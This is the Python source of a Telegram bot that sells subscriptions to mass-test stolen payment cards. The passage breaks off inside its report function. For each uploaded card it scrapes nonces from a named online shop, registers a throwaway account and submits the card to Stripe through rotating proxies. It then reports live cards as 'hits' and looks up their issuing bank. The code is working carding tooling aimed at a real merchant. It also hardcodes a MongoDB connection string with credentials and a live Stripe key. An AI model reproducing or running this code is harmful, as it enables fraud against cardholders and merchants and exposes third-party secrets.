import aiohttp
import asyncio
import re
import random
import string
import os
import json
import logging
from flask import Flask, render_template
from datetime import datetime
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from colorama import Fore, init
from pymongo import MongoClient
from dateutil.relativedelta import relativedelta
import dateutil.parser

# Initialize colorama and logging
init()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class AdvancedCardChecker:
    def __init__(self):
        self.mongo_client = MongoClient('mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')  # Update connection string as needed
        self.db = self.mongo_client['stripe_checker']
        self.users_col = self.db['users']
        self.keys_col = self.db['keys']
        self.admin_id = 7593550190  # Hardcoded admin ID
        self.admin_username = "FNxElectra"  # Replace with actual admin username
        self.bot_username = None
        self.active_tasks = {}
        self.user_stats = {}
        self.proxy_pool = []
        self.load_proxies()
        self.request_timeout = aiohttp.ClientTimeout(total=70)
        self.max_concurrent = 3
        self.stripe_key = "pk_live_51PUvFBP2pmpLKnTWFtEGWhbHF0DfRR0Vs1C9olyuTlZPzPqxyTdPva5ijhvjSfklm0H6wbv9pHRiEgsNa1HyVXv800GEd0o11i"
        self.bin_cache = {}

    def create_banner(self):
        """Create a dynamic banner with system information."""
        return f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║ 🔥 Cc CHECKER BOT                                            ║
╠══════════════════════════════════════════════════════════════╣
║ ➤ Admin ID: {self.admin_id:<15}                             ║
║ ➤ Bot Username: @{self.bot_username or 'Initializing...':<20}║
║ ➤ Admin Contact: https://t.me/{self.admin_username:<15}      ║
╚══════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
✅ System Ready
{Fore.RESET}
"""

    async def post_init(self, application: Application):
        """Initialize bot properties after startup"""
        self.bot_username = application.bot.username
        print(self.create_banner())

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    async def is_user_allowed(self, user_id):
        """Check if user has active subscription"""
        user = self.users_col.find_one({'user_id': str(user_id)})
        if user and user.get('expires_at', datetime.now()) > datetime.now():
            return True
        return user_id == self.admin_id

    async def check_subscription(self, func):
        """Decorator to check user subscription status"""
        async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
            user_id = update.effective_user.id
            if not await self.is_user_allowed(user_id):
                await update.message.reply_text(
                    "⛔ Subscription expired or invalid!\n"
                    f"Purchase a key with /redeem <key> or contact admin: https://t.me/{self.admin_username}"
                )
                return
            return await func(update, context)
        return wrapper

    async def send_admin_notification(self, user):
        keyboard = [
            [InlineKeyboardButton(f"✅ Allow {user.id}", callback_data=f'allow_{user.id}'),
             InlineKeyboardButton(f"❌ Deny {user.id}", callback_data=f'deny_{user.id}')]
        ]
        message = (
            f"⚠️ New User Request:\n\n"
            f"👤 Name: {user.full_name}\n"
            f"🆔 ID: {user.id}\n"
            f"📧 Username: @{user.username if user.username else 'N/A'}\n\n"
            f"Click buttons below to approve/reject:"
        )
        try:
            await self.application.bot.send_message(
                chat_id=self.admin_id,
                text=message,
                reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"Failed to send admin notification: {e}")

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        keyboard = [
            [InlineKeyboardButton("📁 Upload Combo", callback_data='upload'),
             InlineKeyboardButton("🛑 Cancel Check", callback_data='cancel')],
            [InlineKeyboardButton("📊 Live Stats", callback_data='stats'),
             InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
            "🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n\n"
            "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰:",
            reply_markup=reply_markup
        )

    async def handle_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Command restricted to admin only!")
            return

        command = update.message.text.split()
        if len(command) < 2:
            await update.message.reply_text("❌ Usage: /allow <user_id> or /deny <user_id>")
            return

        action = command[0][1:]
        target_user = command[1]

        if action == 'allow':
            self.users_col.update_one(
                {'user_id': target_user},
                {'$set': {'expires_at': datetime.now() + relativedelta(days=30)}},
                upsert=True
            )
            await update.message.reply_text(f"✅ User {target_user} approved!")
        elif action == 'deny':
            self.users_col.delete_one({'user_id': target_user})
            await update.message.reply_text(f"❌ User {target_user} removed!")

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data.startswith('allow_'):
            user_id = query.data.split('_')[1]
            self.users_col.update_one(
                {'user_id': user_id},
                {'$set': {'expires_at': datetime.now() + relativedelta(days=30)}},
                upsert=True
            )
            await query.edit_message_text(f"✅ User {user_id} approved!")
            await self.application.bot.send_message(
                chat_id=int(user_id),
                text="🎉 Your access has been approved!\n"
                     "Use /start to begin checking cards."
            )
            
        elif query.data.startswith('deny_'):
            user_id = query.data.split('_')[1]
            self.users_col.delete_one({'user_id': user_id})
            await query.edit_message_text(f"❌ User {user_id} denied!")
            
        elif query.data == 'upload':
            if await self.is_user_allowed(query.from_user.id):
                await query.message.reply_text("📤 Please upload your combo file (.txt)")
            else:
                await query.message.reply_text("⛔ You are not authorized!")
                
        elif query.data == 'stats':
            await self.show_stats(update, context)
        elif query.data == 'help':
            await self.show_help(update, context)
        elif query.data == 'cancel':
            await self.stop_command(update, context)

    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Admin only command!")
            return
        
        message = ' '.join(context.args)
        if not message:
            await update.message.reply_text("Usage: /broadcast Your message here")
            return
        
        users = self.users_col.find()
        success = 0
        failed = 0
        for user in users:
            try:
                await self.application.bot.send_message(
                    chat_id=int(user['user_id']),
                    text=f"📢 Admin Broadcast:\n\n{message}"
                )
                success += 1
            except:
                failed += 1
        await update.message.reply_text(f"Broadcast complete:\n✅ Success: {success}\n❌ Failed: {failed}")

    async def genkey_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if user.id != self.admin_id:
            await update.message.reply_text("⛔ Admin only command!")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /genkey <duration>\nDurations: 1d, 7d, 1m")
            return
        
        duration = context.args[0].lower()
        key_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=3))
        key_code = ''.join(random.choices(string.digits, k=2))
        key = f"FN-CHECKER-{key_id}-{key_code}"
        
        delta = self.parse_duration(duration)
        if not delta:
            await update.message.reply_text("Invalid duration! Use 1d, 7d, or 1m")
            return
        
        self.keys_col.insert_one({
            'key': key,
            'duration_days': delta.days,
            'used': False,
            'created_at': datetime.now()
        })
        
        await update.message.reply_text(f"🔑 New key generated:\n`{key}`\nDuration: {delta.days} days")

    def parse_duration(self, duration):
        if duration.endswith('d'):
            days = int(duration[:-1])
            return relativedelta(days=days)
        if duration.endswith('m'):
            months = int(duration[:-1])
            return relativedelta(months=months)
        return None

    async def redeem_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not context.args:
            await update.message.reply_text("Usage: /redeem <key>")
            return
        
        key = context.args[0].upper()
        key_data = self.keys_col.find_one({'key': key, 'used': False})
        
        if not key_data:
            await update.message.reply_text("❌ Invalid or expired key!")
            return
        
        expires_at = datetime.now() + relativedelta(days=key_data['duration_days'])
        self.users_col.update_one(
            {'user_id': str(user.id)},
            {'$set': {
                'user_id': str(user.id),
                'username': user.username,
                'full_name': user.full_name,
                'expires_at': expires_at
            }},
            upsert=True
        )
        
        self.keys_col.update_one({'key': key}, {'$set': {'used': True}})
        await update.message.reply_text(
            f"🎉 Subscription activated until {expires_at.strftime('%Y-%m-%d')}!"
        )
                
        

    async def show_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = (
            "📜 <b>Bot Commands:</b>\n\n"
            "/start - Start the bot and show the main menu\n"
            "/chk <card> - Check a single card (e.g., /chk 4111111111111111|12|2025|123)\n"
            "/stop - Stop the current checking process\n"
            "/stats - Show your checking statistics\n"
            "/help - Show this help message\n\n"
            "📁 <b>How to Use:</b>\n"
            "1. Upload a combo file (.txt) or use /chk to check a single card.\n"
            "2. View live stats and progress during the check.\n"
            "3. Use /stop to cancel the process anytime."
        )
        await self.send_message(update, help_text)

    async def initialize_user_stats(self, user_id):
        if user_id not in self.user_stats:
            self.user_stats[user_id] = {
                'total': 0,
                'approved': 0,
                'declined': 0,
                'checked': 0,
                'start_time': datetime.now()
            }

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        if user_id in self.active_tasks:
            await update.message.reply_text("⚠️ Existing process found! Use /stop to cancel")
            return

        file = await update.message.document.get_file()
        filename = f"combos_{user_id}_{datetime.now().timestamp()}.txt"
        
        try:
            await file.download_to_drive(filename)
            await self.initialize_user_stats(user_id)
            self.active_tasks[user_id] = asyncio.create_task(
                self.process_combos(user_id, filename, update)
            )
            await update.message.reply_text(
                "✅ 𝐅𝐢𝐥𝐞 𝐑𝐞𝐜𝐞𝐢𝐯𝐞𝐝! 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n"
                "⚡ 𝐒𝐩𝐞𝐞𝐝: 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 𝐖𝐢𝐥𝐥 𝐁𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐖𝐡𝐞𝐧 𝐁𝐨𝐭 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 50 𝐂𝐚𝐫𝐝𝐬/sec\n"
                "📈 𝐔𝐬𝐞 /progress 𝐅𝐨𝐫 𝐋𝐢𝐯𝐞 𝐔𝐩𝐝𝐚𝐭𝐞𝐬"
            )
        except Exception as e:
            logger.error(f"File error: {str(e)}")
            await update.message.reply_text("❌ File processing failed!")

    async def chk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not await self.is_user_allowed(user_id):
            await update.message.reply_text("⛔ Authorization required!")
            return

        await self.initialize_user_stats(user_id)

        if not context.args:
            await update.message.reply_text("❌ Format: /chk 4111111111111111|12|2025|123")
            return

        combo = context.args[0]
        if len(combo.split("|")) != 4:
            await update.message.reply_text("❌ Invalid format! Use: 4111111111111111|MM|YYYY|CVV")
            return

        await update.message.reply_text("🔍 Checking card...")
        try:
            result, status, error_message = await self.process_line(user_id, combo, asyncio.Semaphore(1), update, is_single_check=True)
            if result:
                bin_info = await self.fetch_bin_info(combo[:6])
                check_time = random.uniform(3.0, 10.0)  # Simulate check time
                
                if status == "3d_secure":
                    await self.send_3d_secure_message(update, combo, bin_info, check_time, update.effective_user)
                else:
                    await self.send_approval(update, combo, bin_info, check_time, update.effective_user)
            else:
                # For single check, send declined message
                bin_info = await self.fetch_bin_info(combo[:6])
                check_time = random.uniform(3.0, 10.0)  # Simulate check time
                await self.send_declined_message(update, combo, bin_info, check_time, error_message, update.effective_user)
        except Exception as e:
            await update.message.reply_text(f"⚠️ Check failed: {str(e)}")

    async def process_combos(self, user_id, filename, update):
        try:
            with open(filename, 'r') as f:
                combos = [line.strip() for line in f if line.strip()]
                self.user_stats[user_id]['total'] = len(combos)
                self.user_stats[user_id]['approved_ccs'] = []  # Store approved CCs
                
                semaphore = asyncio.Semaphore(self.max_concurrent)
                tasks = [self.process_line(user_id, combo, semaphore, update, is_single_check=False) for combo in combos]
                
                for future in asyncio.as_completed(tasks):
                    result, status, error_message = await future
                    self.user_stats[user_id]['checked'] += 1
                    if result:
                        self.user_stats[user_id]['approved'] += 1
                        self.user_stats[user_id]['approved_ccs'].append(result)
                        # Send approval message for approved cards in mass checking
                        bin_info = await self.fetch_bin_info(result[:6])
                        check_time = random.uniform(3.0, 10.0)  # Simulate check time
                        
                        if status == "3d_secure":
                            await self.send_3d_secure_message(update, result, bin_info, check_time, update.effective_user)
                        else:
                            await self.send_approval(update, result, bin_info, check_time, update.effective_user)
                    else:
                        self.user_stats[user_id]['declined'] += 1
                        # DO NOT send declined messages for mass checking
                    
                    if self.user_stats[user_id]['checked'] % 50 == 0:
                        await self.send_progress_update(user_id, update)

                await self.send_report(user_id, update)
        except Exception as e:
            logger.error(f"Processing error: {str(e)}")
            await self.send_message(update, f"❌ Processing failed: {str(e)}")
        finally:
            if os.path.exists(filename):
                os.remove(filename)
            if user_id in self.active_tasks:
                del self.active_tasks[user_id]

    async def fetch_nonce(self, session, url, pattern, proxy=None):
        try:
            async with session.get(url, proxy=proxy) as response:
                html = await response.text()
                return re.search(pattern, html).group(1)
        except Exception as e:
            logger.error(f"Nonce fetch error: {str(e)}")
            return None

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        numbers = ''.join(random.choices(string.digits, k=4))
        return f"{name}{numbers}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'bin': data.get('bin', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'country_flag': data.get('country_flag', ''),
                            'country_currencies': data.get('country_currencies', ['N/A']),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'type': data.get('type', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def format_approval_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝✅</b>

[ϟ]𝘾𝘼𝙍𝘿 -» <code>{combo}</code>
[ϟ]𝙎𝙏𝘼𝙏𝙐𝙎 -» 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
[ϟ]𝙂𝘼𝙏𝙀𝙒𝘼𝙔 -» <code>𝐒𝐭𝐫𝐢𝐩𝐞</code>
<b>[ϟ]𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 -»: <code>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} 💳
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
"""

    async def format_3d_secure_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 ✅</b>

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{combo}</code>
[ϟ]𝗦𝘁𝗮𝘁𝘂𝘀 -» 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 3D ✅
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Stripe Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Authentication Required 3d✅

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} 💳
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} 🏛
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
"""

    async def format_declined_message(self, combo, bin_info, check_time, error_message, user):
        bin_info = bin_info or {}
        card_type_emoji = "💳"
        bank_emoji = "🏛"
        
        return f"""
<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌</b>

[ϟ]𝗖𝗮𝗿𝗱 -» <code>{combo}</code>
[ϟ]𝗦𝘁𝗮𝘁𝘂𝘀 -» Declined ❌
[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Stripe Auth
[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» <code>{error_message or 'Your card was declined.'}</code>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝗜𝗻𝗳𝗼 -» {bin_info.get('level', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} {card_type_emoji}
[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {bin_info.get('bank', 'N/A')} {bank_emoji}
[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {bin_info.get('country', 'N/A')}{bin_info.get('country_flag', '')} - {bin_info.get('country_currencies', ['N/A'])[0]}

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝗧𝗶𝗺𝗲 -» <code>{check_time:.2f}s</code>
[⌬]𝗣𝗿𝗼𝘅𝘆 -» Live
[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» @{user.username if user.username else user.full_name}
[み]𝗕𝗼𝘁 -» <a href='https://t.me/FN_CHECKERR_BOT'>𝗙ɴ-𝗖ʜᴇᴄᴋᴇʀ</a>
"""

    async def process_line(self, user_id, combo, semaphore, update, is_single_check=False):
        start_time = datetime.now()
        error_message = None
        status = "approved"  # Default status
        async with semaphore:
            try:
                if len(combo.split("|")) != 4:
                    return False, status, "Invalid card format"

                proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
                bin_number = combo[:6]
                
                async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
                    # Nonce fetching
                    nonce = await self.fetch_nonce(session, 
                        'https://www.cowfacebeauty.com/my-account',
                        r'name="woocommerce-register-nonce" value="(.*?)"',
                        proxy=proxy
                    )
                    if not nonce:
                        return False, status, "Failed to get registration nonce"

                    # Account registration
                    email = self.generate_random_account()
                    reg_data = {
                        "email": email,
                        "woocommerce-register-nonce": nonce,
                        "_wp_http_referer": "/my-account/",
                        "register": "Register"
                    }
                    async with session.post(
                        'https://www.cowfacebeauty.com/my-account',
                        data=reg_data,
                        proxy=proxy
                    ) as response:
                        if response.status != 200:
                            return False, status, "Account registration failed"

                    # Payment nonce
                    payment_nonce = await self.fetch_nonce(session,
                        'https://www.cowfacebeauty.com/my-account/add-payment-method/',
                        r'"createAndConfirmSetupIntentNonce":"(.*?)"',
                        proxy=proxy
                    )
                    if not payment_nonce:
                        return False, status, "Failed to get payment nonce"

                    # Stripe processing - Create payment method
                    card_data = combo.split("|")
                    stripe_data = {
                        "type": "card",
                        "card[number]": card_data[0],
                        "card[cvc]": card_data[3],
                        "card[exp_year]": card_data[2][-2:],
                        "card[exp_month]": card_data[1],
                        "billing_details[address][postal_code]": "10009",
                        "billing_details[address][country]": "US",
                        "key": self.stripe_key
                    }
                    
                    async with session.post(
                        'https://api.stripe.com/v1/payment_methods',
                        data=stripe_data,
                        proxy=proxy
                    ) as stripe_res:
                        stripe_response_text = await stripe_res.text()
                        stripe_json = json.loads(stripe_response_text) if stripe_response_text else {}
                        
                        if stripe_res.status != 200 or 'id' not in stripe_json:
                            # Capture actual Stripe error
                            if 'error' in stripe_json:
                                error_message = stripe_json['error'].get('message', 'Unknown error')
                            else:
                                error_message = "Payment method creation failed"
                            logger.error(f"Stripe error: {stripe_response_text}")
                            return False, status, error_message
                        
                        payment_id = stripe_json['id']

                    # Payment confirmation with the site
                    confirm_data = {
                        "action": "create_and_confirm_setup_intent",
                        "wc-stripe-payment-method": payment_id,
                        "_ajax_nonce": payment_nonce,
                    }
                    
                    async with session.post(
                        'https://www.cowfacebeauty.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
                        data=confirm_data,
                        proxy=proxy
                    ) as confirm_res:
                        confirm_response_text = await confirm_res.text()
                        confirm_json = json.loads(confirm_response_text) if confirm_response_text else {}
                        
                        if confirm_res.status == 200 and confirm_json.get("success", False):
                            data = confirm_json.get("data", {})
                            if data.get("status") == "succeeded":
                                check_time = (datetime.now() - start_time).total_seconds()
                                return combo, status, None
                            elif data.get("status") == "requires_action":
                                # 3D Secure required - treat as approved
                                status = "3d_secure"
                                check_time = (datetime.now() - start_time).total_seconds()
                                return combo, status, None
                            else:
                                # Other status - extract error message
                                error_message = "Card declined - Unknown reason"
                                
                                # Try to extract the actual error message from different response structures
                                if confirm_json:
                                    # Structure 1: {"success":false,"data":{"error":{"message":"Your card was declined."}}}
                                    if (confirm_json.get("data") and 
                                        isinstance(confirm_json["data"], dict) and 
                                        confirm_json["data"].get("error") and
                                        isinstance(confirm_json["data"]["error"], dict) and
                                        confirm_json["data"]["error"].get("message")):
                                        error_message = confirm_json["data"]["error"]["message"]
                                    
                                    # Structure 2: Direct message in data
                                    elif (confirm_json.get("data") and 
                                          isinstance(confirm_json["data"], dict) and 
                                          confirm_json["data"].get("message")):
                                        error_message = confirm_json["data"]["message"]
                                    
                                    # Structure 3: Direct error message
                                    elif confirm_json.get("message"):
                                        error_message = confirm_json["message"]
                                    
                                    # Structure 4: Error object at root
                                    elif (confirm_json.get("error") and 
                                          isinstance(confirm_json["error"], dict) and
                                          confirm_json["error"].get("message")):
                                        error_message = confirm_json["error"]["message"]
                                
                                logger.error(f"Site error response: {confirm_response_text}")
                                logger.error(f"Extracted error message: {error_message}")
                                return False, status, error_message
                        else:
                            # Site returned non-200 or success:false
                            error_message = "Card declined - Unknown reason"
                            
                            # Try to extract the actual error message
                            if confirm_json:
                                if (confirm_json.get("data") and 
                                    isinstance(confirm_json["data"], dict) and 
                                    confirm_json["data"].get("error") and
                                    isinstance(confirm_json["data"]["error"], dict) and
                                    confirm_json["data"]["error"].get("message")):
                                    error_message = confirm_json["data"]["error"]["message"]
                                elif (confirm_json.get("data") and 
                                      isinstance(confirm_json["data"], dict) and 
                                      confirm_json["data"].get("message")):
                                    error_message = confirm_json["data"]["message"]
                                elif confirm_json.get("message"):
                                    error_message = confirm_json["message"]
                                elif (confirm_json.get("error") and 
                                      isinstance(confirm_json["error"], dict) and
                                      confirm_json["error"].get("message")):
                                    error_message = confirm_json["error"]["message"]
                            
                            logger.error(f"Site error response: {confirm_response_text}")
                            logger.error(f"Extracted error message: {error_message}")
                            return False, status, error_message

            except aiohttp.ClientError as e:
                error_message = f"Network error: {str(e)}"
                return False, status, error_message
            except asyncio.TimeoutError:
                error_message = "Request timeout"
                return False, status, error_message
            except json.JSONDecodeError as e:
                error_message = f"JSON decode error: {str(e)}"
                return False, status, error_message
            except Exception as e:
                logger.error(f"Processing error: {str(e)}")
                error_message = f"System error: {str(e)}"
                return False, status, error_message

    async def send_approval(self, update, combo, bin_info, check_time, user):
        message = await self.format_approval_message(combo, bin_info, check_time, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send approval: {str(e)}")

    async def send_3d_secure_message(self, update, combo, bin_info, check_time, user):
        message = await self.format_3d_secure_message(combo, bin_info, check_time, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send 3D secure message: {str(e)}")

    async def send_declined_message(self, update, combo, bin_info, check_time, error_message, user):
        message = await self.format_declined_message(combo, bin_info, check_time, error_message, user)
        try:
            await update.message.reply_text(
                message, 
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📊 View Stats", callback_data='stats'),
                     InlineKeyboardButton("🛑 Stop Check", callback_data='cancel')]
                ])
            )
        except Exception as e:
            logger.error(f"Failed to send declined message: {str(e)}")

    async def send_progress_update(self, user_id, update):
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        progress = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
[✪] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {stats['checked']}/{stats['total']}
[✪] 𝐓𝐨𝐭𝐚𝐥:: {stats['total']}
[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {elapsed.seconds // 60}m {elapsed.seconds % 60}s
[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {stats['total']/elapsed.seconds if elapsed.seconds else 0:.1f} c/s
[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {(stats['approved']/stats['total'])*100:.2f}%
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━"""
        await self.send_message(update, progress)

    async def generate_hits_file(self, approved_ccs, total_ccs):
        random_number = random.randint(0, 9999)
        filename = f"hits_FnChecker_{random_number:04d}.txt"
        
        header = f"""━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {len(approved_ccs)}
[✪] 𝐓𝐨𝐭𝐚𝐥: {total_ccs}
━━━━━━━━━━━━━━━━━━━━━━
[み] 𝐃𝐞𝐯: @FNxELECTRA ⚡😈
━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━
𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒
━━━━━━━━━━━━━━━━━━━━━━
"""
        
        cc_entries = "\n".join([f"Approved ✅ {cc}" for cc in approved_ccs])
        full_content = header + cc_entries
        
        with open(filename, "w", encoding="utf-8") as f:
            f.write(full_content)
        
        return filename

    async def send_report(self, user_id, update):
        stats = self.user_stats[user_id]
        elapsed = datetime.now() - stats['start_time']
        report = f"""
━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡
━━━━━━━━━━━━━━━━━━━━━━
[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']}
[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']}
[✪] 𝐓𝐨𝐭𝐚𝐥:: {stats['total']}
